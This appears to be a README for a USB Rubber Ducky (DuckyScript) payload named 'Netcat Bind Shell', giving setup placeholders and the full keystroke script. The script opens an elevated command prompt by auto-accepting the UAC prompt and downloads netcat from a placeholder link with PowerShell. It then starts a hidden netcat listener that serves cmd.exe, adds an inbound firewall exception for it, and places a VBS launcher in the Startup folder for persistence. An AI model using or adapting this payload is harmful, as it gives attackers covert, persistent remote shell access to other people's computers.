### **Change the following details**:
* **[NETCAT_DOWNLOAD_LINK]**: Your Netcat download link.
* **[PORT]**: The port on the target machine you want netcat to listen on.
* **Directory**: Use something other than %TEMP% if you want to.

## **CODE**:
```
REM Title: Netcat Bind Shell
REM Author: Kanishk Singh
REM Version: 1
REM Description:
DELAY 200
REM --> Minimize all windows
WINDOWS d
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb RunAs
ENTER
DELAY 1500
ALT y
DELAY 500
STRING cd %ROOT%
ENTER

REM --> Kills already running Netcat instance (if any)
STRING TASKKILL /im nc.exe /f
ENTER
REM --> Delete nc.exe file if it already exists
STRING erase /Q nc.exe
ENTER
REM --> Delete Start batch file if it already exists
STRING erase /Q Start.bat
ENTER
REM --> Delete Invisible.vbs in temp folder, if it already exists
STRING erase /Q invisible.vbs
ENTER
REM --> Delete invisible.vbs file in Startup if it already exists
STRING erase /Q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\invisible.vbs"
ENTER
DELAY 500

REM --> Downloads NetCat
STRING powershell (new-object System.Net.WebClient).DownloadFile('http://[NETCAT_DOWNLOAD_LINK]/nc.exe','nc.exe')
ENTER
DELAY 500

REM --> Creates a batch file to start listening 
STRING copy con Start.bat
ENTER
STRING cd %ROOT%
ENTER
STRING nc -lp [5555] -vv -e cmd.exe -L
ENTER
CONTROL z
ENTER

REM --> Starts batch file invisibly 
STRING copy con invisible.vbs
ENTER
STRING Set WshShell = CreateObject("WScript.Shell" ) 
ENTER
STRING WshShell.Run chr(34) & "%TEMP%\Start.bat" & Chr(34), 0 
ENTER
STRING Set WshShell = Nothing 
ENTER
CONTROL z
ENTER
REM --> Add netcat to allowed programs list, enabling it to communicate through the firewall seamlessly
STRING netsh advfirewall firewall add rule name="Netcat" dir=in action=allow program="%TEMP%\nc.exe" enable=yes
ENTER
STRING start invisible.vbs
ENTER
DELAY 100

REM --> Copies invisible.vbs to startup folder for persistence
STRING copy "invisible.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
ENTER
REM --> Kills CMD while nc.exe continues running in background, remove Ducky after CMD closes
STRING exit 
ENTER
```

## **To-Do**:
* Test whether the script executes at startup.